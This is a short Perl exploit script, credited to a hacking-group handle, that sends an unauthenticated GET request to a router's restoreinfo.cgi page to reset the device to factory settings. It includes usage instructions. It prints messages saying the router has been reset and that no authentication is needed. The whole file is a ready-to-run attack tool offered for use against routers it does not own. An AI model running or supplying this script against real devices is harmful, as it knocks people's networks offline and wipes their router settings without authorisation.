#!/usr/bin/perl
# By ALpHaNiX
# NullArea.Net
# THanks

use HTTP::Request;
use HTTP::Headers;
use LWP::UserAgent;

if (@ARGV != 1) { &help; exit(); }
if ($ARGV[0] =~ /http:\/\// ) { $ip = $ARGV[0]."/"; } else { $ip = "http://".$ARGV[0]."/"; }
print "[+] Working on it\n\n";

sub help(){
    print "[X] Usage : ./exploit.pl 127.0.0.1 \n";
}

$restore = "restoreinfo.cgi" ;
$target = $ip.$restore ;
my $request   = HTTP::Request->new(GET=>$target);
my $useragent = LWP::UserAgent->new();
$useragent->timeout(10);
my $response  = $useragent->request($request);
print "[+] Note : No Auth Needed For this operation !\n" ;
print "[+] Exploited , This Rooter $ip Have been reseted !" ;
